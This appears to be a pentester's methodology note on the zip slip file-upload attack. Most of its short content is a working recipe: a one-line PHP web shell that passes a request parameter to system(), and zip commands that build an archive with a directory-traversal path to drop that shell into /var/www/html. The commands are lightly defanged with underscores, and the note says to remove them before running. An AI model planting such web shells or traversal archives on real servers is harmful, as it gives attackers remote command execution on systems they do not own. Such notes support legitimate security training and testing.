### zip slip attack:

> [!NOTE] Windows Defender Antivirus (AV) triggers on `.md` (Markdown) files, often flagging them as potential threats. As a result, the commands provided below have been defanged to avoid false positives. Kindly remove the  `_` before executing them.

<https://youtu.be/kE36IGAU5rg?t=1108>

> [!NOTE]
> ```
> cd /var/www/html
> gedit webshell.p_h_p
> ```

> [!NOTE]
> ```
> <?p_h_p system($_REQUEST['c_m_d']); ?>
> ```

> [!NOTE]
> ```
> zip zipslip.z_i_p ../../../../../../../../var/www/html/web_sh_ell.p_h_p
> 7z l zipslip.z_i_p
> ```

![unnamed_8dc2b8c69f0e4907abcec3cdbb5ee389](docs/Attachments/Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/File%20upload/zip%20slip/{{notename}}-202605011506-1.png)
![[docs/Attachments/Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/File upload/zip slip/{{notename}}-202605011506.png]]